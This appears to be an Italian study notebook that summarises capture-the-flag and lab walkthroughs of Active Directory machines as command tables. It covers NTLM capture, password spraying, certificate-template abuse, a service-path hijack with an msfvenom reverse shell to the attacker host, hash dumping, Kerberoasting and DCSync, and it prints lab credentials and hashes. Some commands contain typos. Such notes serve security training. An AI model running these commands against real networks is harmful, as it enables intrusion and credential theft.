| **Relay Attack**                          | 1. `nxc mssql IP_TARGET -u USER -p PASS --local-auth`<br>2. `responder -I tun0`<br>3. *TARGET:*`xp_dirtree \\IP_KALI\ERROR`<br>4. `john hash --wordlist=rockyou.txt`                                                                                                                                                                                                                                                                                      | Provando ad accedere con la *1.* riusciamo ad entrare nel database, da qui possiamo provare ad effettuare una chiamata verso la nostra macchina per ottenere l'NTLM dell'account associato. Utilizziamo la *2.* per mettere in ascolto e la *3.* per effettuare la chiamata. Ottenuto la l'NLTM usiamo la *4.* per craccare l'NTLM                                                                                                                                                                                |
| **Logs**                                  | 1. `for proto in {smb,winrm,mssql,ldap}; do nxc $proto IP_TARGET -u USER -p PASS; done`                                                                                                                                                                                                                                                                                                                                                                   | Con le nuove credenziali `sql_svc:REGGIE1234ronnie` riproviamo la *1.* e notiamo che abbiamo accesso alla macchina tramite servizio *WINRM*<br>Troviamo il file `C:\SQLServer\logs\ERRORLOG.BAK`, aprendolo in locale troviamo dei tentativi di accesso delle credenziali `Ryan.Cooper:NuclearMosquito3`. Riproviamo la *1.* e notiamo che abbiamo accesso a *WINRM*                                                                                                                                              |
| **Certificate Service DCOM Access Group** | 1. `certipy-ad find -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip IP_TARGET -vulnerable -stdout`<br>2. `certipy-ad req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -target IP_TARGET -template UserAuthentication -ca sequel-DC-CA -upn Administrator@sequel.htb`<br>3. `ntpdate IP_TARGET`<br>4. `certipy-ad auth-pfx administrator.pfx -dc-ip IP_TARGET -u Administrator -domain sequel.htb`<br>5. `evil-winrm -i IP_TARGET -u Administrator -H HASH` | Notiamo che l'utente `Ryan.Cooper` fa parte del gruppo *Certificate Service DCOM Access* che ha permessi sulla gestione dei certificati.<br>Con la *1.* enumeriamo i certificati disponibili e troviamo `UserAuthentication` che √® vulnerabile a [ESC1](https://github.com/ly4k/Certipy). <br>Utilizziamo la *2.* per richiedere un certificato per l'utente `Administrator`, sincronizziamo gli orologi con il target con la *3.*, richiediamo il TGT amministratore con la *4.* ed infine accediamo con la *5.* |


- [writeup](https://olivierkonate.medium.com/hackthebox-escape-efb931121a08)

## SSRF

### Return

| **üß† Azione**              | **üíª Comando Chiave**                                                                                                                                                                                                                                                                                                                                           | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                  |
| -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **SSRF**                   | 1. ![[Pasted image 20250828164244.png]]                                                                                                                                                                                                                                                                                                                         | Sulla porta `80` notiamo un servizio che manda una richiesta ad un endpoint. Catturando la richiesta ed inserendo il nostro IP catturiamo la richiesta ed otteniamo le credenziali `svc-printer` come in *1.*                                                                                                                                                                                          |
| **Password spraying**      | 1. `for proto in {smb,winrm,wmi,ldap}; do nxc $proto IP_TARGET -d DOMAIN -u svc-printer -p '1edFg43012!!'; done`<br>2. `evil-winrm -i IP_TARGET -u svc-printer -p '1edFg43012!!'`                                                                                                                                                                               | Utilizziamo la *1.* per provare l'utenza su tutti i protocolli e scopriamo che possiamo accedere con `evil-winrm` con la *2.*                                                                                                                                                                                                                                                                          |
| **Server Operators Group** | 1. `whoami /all`<br>2. `services`<br>3. `sc.exe config VGAuthService binPath="C:\Users\svc-printer\AppData\Local\Temp\nc.exe IP_KALI 443"`<br>4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_KALI LPORT=443 -f exe-service -o rev.exe`<br>5. `upload rev.exe`<br>6. `nc -lvnp 443`<br>7. `sc.exe stop VGAuthService`<br>8. `sc.exe start VGAuthService` | Controllando i gruppi con la *1.* notiamo *Server Operators* che √® vulnerabile a [privilege escalations](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/).<br>Identifichiamo i programmi con la *2.*, cambiamone il percorso `binPath` con la *3.*, carichiamo la reverse she con la *4.* e carichiamola con la *5.* , avviamo una reverse shell con la *7.* e *8.* |


- [writeup](https://olivierkonate.medium.com/hackthebox-return-73fdf3e4a277)

## LDAP

### Ledger

| **üß† Azione**            | **üíª Comando Chiave**                                                                                                                                                                                                                                                                                                                                              | **üìù Output / Scopo**                                                                                                                                                                                                                                          |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **LDAP**                 | 1. `ldapsearch -x -H ldap://IP_TARGET -b "dc=DOMAIN,dc=TLD"`<br>2. `ldapsearch -x -H ldap://IP_TARGET -b "dc=DOMAIN,dc=TLD" \| grep DistinguishedName`                                                                                                                                                                                                             | Utilizziamo la *1.* per enumerare tutta la struttura *LDAP*. Dei risultati trovati poi greppiamo con la *2.* per trovare gli utenti presenti.                                                                                                                  |
| **LDAP Description**     | 1. `ldapsearch -x -H ldap://IP_TARGET -b "dc=DOMAIN,dc=TLD" \| grep Description`                                                                                                                                                                                                                                                                                   | Utilizziamo la *1.* per filtrare le descrizione degli utenti da dove ci ricaviamo la password `CHANGEME2023!`                                                                                                                                                  |
| **Password Spraying**    | 1. `nxc smb -u users.txt -p CHANGEME2025!`                                                                                                                                                                                                                                                                                                                         | Utilizziamo la *1.* per vedere se qualche utente ha la password associata al servizio *SMB*                                                                                                                                                                    |
| **BloodHound**           | 1. `bloodhound-python -d thm.local -u Susanna_MCKnight -p CHANGEME2023\! -ns IP_TARGET -c all`<br>2. `neo4jconsole`<br>3. `bloodhound`                                                                                                                                                                                                                             | Avviamo BloodHound con la *1.* ma a quanto pare non c'√® nulla di interessante                                                                                                                                                                                  |
| **Privilege Escalation** | 1. `certipy-ad find -u 'Susanna_McKnight@thm.local' -p CHANGEME2023\! -dc-ip IP_TARGET -vulnerable -enabled`<br>2. `certipy-ad req -u 'Susanna_McKnight@thm.local' -p 'CHANGEME2023! -dc-ip 'IP_TARGET' -target 'labyrinth.thm.local' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'Bradley_Ortiz@thm.local'`<br>3. `certipy-ad auth -pfx bradley_ortiz.pfx` | Applicando la *1.* cerchiamo tra i certificati disponibili e le loro vulnerabilit√† e troviamo che √® vulnerabile `ESC1`. Utilizziamo la *2.* per impersonare un'utenza amministrativa. Con il certificato `.pfx` effettuiamo l'accesso *3.* ed otteniamo l'NTLM |
| **Login**                | 1. `wmiexec.py thm.local/bradley_ortiz@IP_TARGET -hashes NTLM`<br>2. `net group "Domain Admins" Susanna_McKnight /add /domain`<br>                                                                                                                                                                                                                                 | Effettuiamo l'accesso con `wmiexec.py`, poi inseriamo `Susanna_McKnight` tra gli utenti amministratori con la *2.*                                                                                                                                             |
| **Dump**                 | 1. `secretsdump.py thm.local/Susanna_McKnight:'CHANGEME2023!'@IP_KALI`<br>2. `xfreerdp /v:IP_KALI /u:Susanna_McKnight /p:CHANGEME2023! /dynamic-resolution`                                                                                                                                                                                                        | Con la *1.* scarichiamo gli NTLM di tutti gli utenti e poi effettuiamo l'accesso con la *2.*                                                                                                                                                                   |


- [writeup](https://happycamper84.medium.com/ledger-tryhackme-walkthrough-0ad6f20cbad8)


### Hutch

| **üß† Azione**         | **üíª Comando Chiave**                                                                                                                                                                                                 | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **User Enumeration**  | 1. `ldapsearch -H ldap://IP_TARGET -x -s base namingcontexts`<br>2. `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://IP_TARGET" "(objectclass=*)"`<br>3. `kerbrute userenum -d hutch.offsec --dc IP_TARGET users` | Con il servizio *LDAP* possiamo enumerare gli utenti presenti sulla macchina. Utilizziamo la *1.* per ottenere le info sul dominio e la *2.* per ottenere gli utenti. Tra i commenti troviamo la password `CrabSharkJellyfish192` ed infine utilizziamo la *3.* per verificare gli utenti trovati tramite il servizio *Kerberos*                                    |
| **Password spraying** | 1. `crackmapexec smb IP_TARGET -u users.txt 'PASS' -d hutch.offsec`                                                                                                                                                   | Con la password trovata precedentemente usiamo la *1.* per fare password spraying e scopriamo le seguenti credenziali valide `fmcsorley:CrabSharkJellyfish192`                                                                                                                                                                                                      |
| **BloodHound**        | 1. `./bloodhound.py -u fmcsorley -p ‚ÄòCrabSharkJellyfish192‚Äô -d hutch.offsec -c All -ns IP_TARGET`<br>2. `neo4j console`<br>3. `bloodhound`                                                                            | Con la *1.* utilizziamo le credenziali appena trovate per scaricare tutta l'architettura dell'AD                                                                                                                                                                                                                                                                    |
| **ReadLAPSPassword**  | 1. `python pyLAPS.py ‚Äî action get -d ‚Äúhutch.offsec‚Äù -u ‚Äúfmcsorley‚Äù -p ‚ÄúCrabSharkJellyfish192‚Äù`<br>2. `evil-winrm -i IP_TARGET -u administrator -p 'PASS'`                                                             | Notiamo che l'utente che controlliamo `fmcsorley` ha i permessi *ReadLAPSPassword* che permettono di leggere la password del servizio LAP di un qualsiasi utente. Scarichiamo [pyLAPS](https://raw.githubusercontent.com/p0dalirius/pyLAPS/main/pyLAPS.py) ed usiamo la *1.* per leggere la password dell'amministratore ed infine la *2.* per effettuare l'accesso |

- [writeup](https://medium.com/@CN-0x/hutch-provinggrounds-write-up-837ca13923cf)
## NTDS Dumping

### Resourced

| **üß† Azione**        | **üíª Comando Chiave**                                                                                                                                                                                                                       | **üìù Output / Scopo**                                                                                                                                                                                                 |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **User Enumeration** | 1. `enum4linux -a IP_TARGET`<br>2. `smbclient -L //IP_TARGET/ -U V.Ventz`                                                                                                                                                                   | Utilizziamo la *1.* per enumerare gli utenti presenti sulla macchina target e troviamo tra i commenti l credenziali `V.Ventz:HotelCalifornia194!`. Proviamo ad autenticarci con la *2.* e troviamo il file `ntds.dit` |
| **NTDS Dumping**     | 1. `impacket-secretdump -ntds ntds.dit -system SYSTEM LOCAL`<br>2. `crackmapexec winrm IP_TARGET -u userslist.txt -H hasheslist.txt`<br>3. `evil-winrm  -i IP_TARGET -u L.Livingstone -H 'HASH'`                                            | Il file `ntds.dit` contiene tutte le informazioni sul DC. Utilizziamo la *1.* per dumpare gli hash degli utenti. Proviamo tutti gli hash  degli utenti con la *2.*. Entriamo con la *3.*                              |
| **BloodHound**       | 1. `upload /home/chw/Resourced/SharpHound.ps1`<br>2. `powershell -ep bypass`<br>3. `. .\SharpHound.ps1`<br>4. `Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\L.Livingstone\Documents"`<br>5. `download BLOODHOUND.zip` |                                                                                                                                                                                                                       |
|                      | 1. `addcomputer.py resourced.local/l.livingstone -dc-ip IP_TARGET -hashes :HASH -computer-name 'NewPa$$1' -computer-pass 'Rajesh@Mondal'`                                                                                                   |                                                                                                                                                                                                                       |

- [writeup](https://r4j3sh.medium.com/offsec-resourced-proving-grounds-practice-writeup-78e132df93cf)

## Others
### Active

| üß† Azione                                     | üíª Comando Chiave                                                                           | üìù Output / Scopo                                  |
| --------------------------------------------- | ------------------------------------------------------------------------------------------- | -------------------------------------------------- |
| **Enum iniziale SMB**                         | `enum4linux 10.10.10.100`                                                                   | Info su utenti, share e dominio                    |
| **Accesso anonimo a share `Replication`**     | `smbclient //10.10.10.100/Replication -U ""%"`                                              | Trovo file `.xml` con `cpassword`                  |
| **Decifro la password GPP**                   | `gpp-decrypt edBSHOwhZLTjt/...`                                                             | Password trovata: `GPPstillStandingStrong2k18`     |
| **Uso credenziali `SVC_TGS` per cercare SPN** | `GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100`          | SPN trovato per: `Administrator`                   |
| **Richiedo TGS (Kerberoasting)**              | `GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request` | Ottengo hash TGS ‚Üí salvo in `admin_hash.txt`       |
| **Cracko l‚Äôhash offline con `hashcat`**       | `hashcat -m 13100 admin_hash.txt /usr/share/wordlists/rockyou.txt --force`                  | Password `Administrator`: `Ticketmaster1968`       |
| **Accesso come `Administrator` a C$***        | `smbclient -U 'Administrator%Ticketmaster1968' //10.10.10.100/C$`                           | Accedo a `C:\Users\Administrator\Desktop\root.txt` |

- [writeup](https://medium.com/@enigma_/hacking-active-on-hack-the-box-a-step-by-step-oscp-journey-52e2b106555d)

### Forest

| **üß† Azione**                          | **üíª Comando Chiave**                                                                                                                                                                                                                                                                                                                                                                                                          | **üìù Output / Scopo**                                                                                                                                                                         |
| -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Enum iniziale SMB**                  | `enum4linux -a 10.10.10.161`                                                                                                                                                                                                                                                                                                                                                                                                   | Info su utenti, share e dominio                                                                                                                                                               |
| **Kerberoasting**                      | `impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.161`                                                                                                                                                                                                                                                                                                                                             | Con gli utenti raccolti faccio kerberoasting e trovo l'hash di `svc-alfresco`                                                                                                                 |
| **Decifro la password AS-REP**         | `hashcat -m 18200 users.txt /usr/share/wordlists/rockyou.txt`                                                                                                                                                                                                                                                                                                                                                                  | Password trovata: `s3rvice`                                                                                                                                                                   |
| **SharpHound.exe**                     | 1. `upload SharpHound.exe`<br>2. `./SharpHound.exe -c All`<br>3. `download xxxxxxx-BloodHound.zip`                                                                                                                                                                                                                                                                                                                             | Carichiamo sulla macchina target SharpHound, eseguiamolo e scarichiamo il risultato                                                                                                           |
| **Avviamo BloodHound**                 | 1. `neo4j console`<br>2. `bloodhound`                                                                                                                                                                                                                                                                                                                                                                                          | Avviamo BllodHound in locale e carichiamo il file scaricato `xxxxxxx-BloodHound.zip`                                                                                                          |
| **BloodHound**                         |                                                                                                                                                                                                                                                                                                                                                                                                                                | Vediamo che l'account `svc-alfresco` appartiene al gruppo `Operators`, che a loro volta appartengono a `Exchange Windows Permissions` che hanno privilegi DACL                                |
| **Creazione utente con privilegi ACL** | 1. `net user hacker password /add`<br>2. `net group "Exchange Windows Permissions" hacker /add`<br>3. `Import-Module ./PowerView.ps1`<br>4. `$pass = convertto-securestring 'password' -AsPlainText -Force`<br>5. `$cred = New-Object System.Management.Automation.PSCredential('htb\hacker', $pass)`<br>6. `Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity hacker -Rights DCSync` | Creo un nuovo utente chiamato `hacker`, lo aggiungo al gruppo `Exchange Windows Permissions` e gli aggiungo i permessi ACL in modo che possa scaricare le password hashate degli altri utenti |
| **Password**                           | `impacket-secretsdump 'hacker:password@10.10.10..161'`                                                                                                                                                                                                                                                                                                                                                                         | Scarico le password degli utenti, tra cui anche `Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::<br>`                                                  |
| **Administrator**                      | `evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6`                                                                                                                                                                                                                                                                                                                                              | Accedo come `Adminsitrator`                                                                                                                                                                   |

- [writeup](https://olivierkonate.medium.com/hackthebox-forest-05a08a9070eb)

### Administrator

| **üß† Azione**           | **üíª Comando Chiave**                                                                                                                                          | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                         |
| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **BloodHound**          | 1. `bloodhound-python -c ALL -u olivia -p ichliebedich -d administrator.htb -dc administrator.htb -ns IP_TARGET`                                               | Fin dall'inizio ci vengono fornite le credenziali `olivia:ichliebedich` che utilizziamo con la *1.* per bloodhound                                                                                                                                                                                                                                                                            |
| **GenericAll**          | 1. `net rpc password michael 'password123' -U administrator.htb/olivia%'ichliebedich' -S IP_TARGET`                                                            | Scopriamo che `olivia` ha i permessi *GenericAll* sull'utente `michael` dunque possiamo cambiarne la password con la *1.*                                                                                                                                                                                                                                                                     |
| **ForceChangePassword** | 1. `net rpc password "benjamin" "password123" -U "administrator.htb"/"michael"%"password123" -S IP_TARGET`                                                     | L'utente `michael` ha i permessi *ForceChangePassword* sull'utente `benjamin` dunque utilizziamo la *1.* per cambiargli la password                                                                                                                                                                                                                                                           |
| **Backup .psafe3 File** | 1. `hashcat -m 5200 backup.psafe3 rockyou.txt`<br>2. `pwsafe`<br>3. ![[Pasted image 20250830185342.png]]<br>4. ![[Pasted image 20250830185439.png]]            | L'utente `benjamin` pu√≤ accedere al servizio *FTP* dove troviamo il file `backup.psafe3`.<br>Utilizziamo la *1.* per craccarne la password, scarichiamo [passwordsafe](https://sourceforge.net/projects/passwordsafe/files/Linux/) da qui, poi la *2.* per aprirlo, inseriamo la password trovata come nella *3.* ed infine copiamo la password degli utenti con il doppio click come in *4.* |
| **GenericWrite**        | 1. `ntpdate IP_TARGET`<br>2. `python3 targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb`<br>3. `john hash rockyou.txt` | L'utente `emily` che otteniamo dal precedente passaggio, ha i permessi *GenericWrite* sull'utente `ethan` dunque possiamo applicare del Kerberoasting.<br>Utilizziamo la *1.* per sincronizzare gli orologi, scarichiamo [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast), usiamo la *2.* per ottenere il ticket che cracchiamo con la *3.*                           |
| **DCSync**              | 1. `impacket-secretsdump ethan:PASS@DOMAIN`<br>2. `evil-winrm -i IP_TARGET -u administrator -H HASH`                                                           | L'utente `ethan` ha i permessi *DCSync* sulla macchina target, dunque possiamo scaricare gli hash di tutti gli utenti compreso l'amministratore.<br>Utilizziamo la *1.* per scaricare gli hash e la *2.* per accedere come amministratore                                                                                                                                                     |

- [writeup](https://publish.obsidian.md/cn-0x-writeups/Hack+The+Box/Administrator/Administrator+Write-Up)